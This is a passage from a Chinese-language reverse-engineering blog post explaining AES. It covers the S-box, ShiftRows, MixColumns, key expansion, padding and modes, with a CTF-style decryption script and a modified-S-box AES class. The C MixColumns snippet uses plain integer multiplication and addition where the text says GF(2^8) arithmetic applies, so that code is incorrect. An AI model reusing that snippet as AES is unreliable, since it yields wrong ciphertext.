class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>,<br><span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>,<br><span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>,<br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br><span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>&#125;;<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009427677-c6d93718-7ebe-4d87-80b5-a72a179a5c1c.png" class="" title="img"><p>特征值<strong>：&gt;&gt;4  &amp;0xF</strong></p><h3 id="行位移"><a href="#行位移" class="headerlink" title="行位移"></a>行位移</h3><p>只在4×4矩阵的行间进行操作，每行4字节的数据。在加密时，保持矩阵的第一行不变，第二行向左移一个字节、第三行向左移2个字节、第四行向左移3个字节</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009530480-a3c0925f-502d-46a2-8703-74027c4f7452.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009546418-117deded-2f60-4ed6-bdae-58ead405dd1a.png" class="" title="img"><p><strong>特征值：三个&gt;&gt;和&lt;&lt;</strong></p><p>也可以这样，这个真有点抽象</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1706086418277-4c776b78-c130-4fb2-8dcd-8136bea929be.png" class="" title="img"><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721699971674-0a74c06c-3b18-4598-99d6-184e37ea5562.png" class="" title="img"><h3 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h3><p>在加密的正向列混淆中，我们要将输入的4·4矩阵左乘一个给定的4·4矩阵。而它们之间的加法、乘法都在扩展域GF(2^8)中进行，所以也就可以将这一个步骤分成两个部分进行讲解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> MixArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] =<br>&#123;<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">MixColum</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>(*PlainArray)[<span class="hljs-number">4</span>])</span><br>&#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ArrayTemp[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>    <span class="hljs-built_in">memcpy</span>(ArrayTemp, PlainArray, <span class="hljs-number">16</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>        &#123;<br>            PlainArray[i][j] =<br>            MixArray[i][<span class="hljs-number">0</span>] * ArrayTemp[<span class="hljs-number">0</span>][j] +<br>            MixArray[i][<span class="hljs-number">1</span>] * ArrayTemp[<span class="hljs-number">1</span>][j] +<br>            MixArray[i][<span class="hljs-number">2</span>] * ArrayTemp[<span class="hljs-number">2</span>][j] +<br>            MixArray[i][<span class="hljs-number">3</span>] * ArrayTemp[<span class="hljs-number">3</span>][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1721700131232-474c042d-74f2-457d-912f-e311fecaab9c.png" class="" title="img"><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>在密钥加法层中有两个输入的参数，分别是明文和子密钥k，而且这两个输入都是128位的。在%2的扩展域中加减法与异或运算等价，所以这里只需异或</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690009117330-39bdc891-aba1-4e93-a5e1-9a3187705a95.png" class="" title="img"><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>子密钥的生成是以列为单位进行的，一列是32Bit，四列组成子密钥共128Bit。生成子密钥的数量比AES算法的轮数多一个，因为第一个密钥加法层进行密钥漂白时也需要子密钥。密钥漂白是指在AES的输入盒输出中都使用的子密钥的XOR加法。子密钥在图中都存储在W[0]、W[1]…W[43]的扩展密钥数组之中</p><p>k1-k16表示原始密钥对应的字节，而图中子密钥k0与原始子密钥相同。在生成的扩展密钥中W的下标如果是4的倍数时(从零开始)需要对异或的参数进行G函数处理</p><p>扩展密钥生成有关公式如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&lt;= i &lt;= <span class="hljs-number">10</span><br><span class="hljs-number">1</span>&lt;= j &lt;= <span class="hljs-number">3</span><br>W[<span class="hljs-number">4</span>i] = W[<span class="hljs-number">4</span>(i<span class="hljs-number">-1</span>)] ^ T(W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>]);<br>W[<span class="hljs-number">4</span>i+j] = W[<span class="hljs-number">4</span>(i<span class="hljs-number">-1</span>)+j] ^ W[<span class="hljs-number">4</span>i<span class="hljs-number">-1</span>+j];<br></code></pre></td></tr></table></figure><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690012128070-bb35c99c-29d8-4e75-ae4b-07e7b4245b96.png" class="" title="img"><p>T函数实现较复杂</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1711079059952-9a5a9730-8634-4b74-8dd1-b49bc974ceba.jpeg" class="" title="img"><h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><p>几种典型的填充方式：</p><p><strong>NoPadding</strong>： 不做任何填充，但是要求明文必须是16字节的整数倍</p><p><strong>PKCS5Padding（默认）</strong>： 如果明文块少于16个字节，在明文块末尾补足相应数量的字符，且每个字节的值等于缺少的字符数。 比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }</p><p><strong>ISO10126Padding</strong>：如果明文块少于16个字节（128bit），在明文块末尾补足相应数量的字节，最后一个字符值等于缺少的字符数，其他字符填充随机数。比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</p><p>PKCS7Padding原理与PKCS5Padding相似，区别是PKCS5Padding的blocksize为8字节，而PKCS7Padding的blocksize可以为1到255字节</p><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><p>AES的工作模式，体现在把明文块加密成密文块的处理过程中。AES加密算法提供了五种不同的工作模式：CBC,ECB,CTR,CFB,OFB</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690264717940-bec2a882-45fa-45c4-a1c4-23670f7b6ba1.png" class="" title="img"><p>适合加密随机数据</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690264745779-c3d4ad6b-2983-4bd2-aef1-588027847abd.png" class="" title="img"><p>适合软件加密:CFB,OFB,CTR</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>标准aes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-number">0x554B134A029DE539438BD18604BF114</span><br><br>key_bytes = key.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(key_bytes)<br><br>encrypted_data = <span class="hljs-string">&quot;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&quot;</span><br><br>encrypted_bytes = base64.b64decode(encrypted_data)<br><br><br>cipher = AES.new(key_bytes, AES.MODE_ECB)<br><br><span class="hljs-keyword">try</span>:<br>    decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">except</span> (ValueError, KeyError):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败或填充错误！&quot;</span>)<br></code></pre></td></tr></table></figure><p>这是修改s盒的代码，密文只能16位一组解密，密文按顺序提取unspaced即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-built_in">print</span>(raws)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span 